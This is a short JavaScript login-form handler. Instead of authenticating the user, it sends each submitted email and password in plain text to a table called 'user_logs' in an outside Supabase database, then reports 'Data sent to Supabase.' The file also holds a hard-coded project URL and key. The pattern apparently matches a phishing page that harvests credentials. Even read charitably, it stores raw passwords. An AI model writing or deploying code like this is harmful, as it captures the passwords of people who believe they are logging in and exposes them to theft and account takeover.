const SUPABASE_URL = "https://vhkxrhuygujrghgjikdu.supabase.co";
const SUPABASE_ANON_KEY = "sb_publishable_NaZ5L8e0wq_hzQ8WNCk_cQ_zMPI5FB-";

// Corrected initialization using window object
const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
const authForm = document.getElementById('login-form');

authForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const userIdentity = document.getElementById('identity-input').value; 
    const userPassword = document.getElementById('password-input').value;

    const { data, error } = await supabase
      .from('user_logs') 
      .insert([
        { 
          email: userIdentity, 
          password: userPassword       
        }
      ]);

    if (error) {
        alert("Database Error: " + error.message);
    } else {
        alert("Success! Data sent to Supabase.");
    }
});
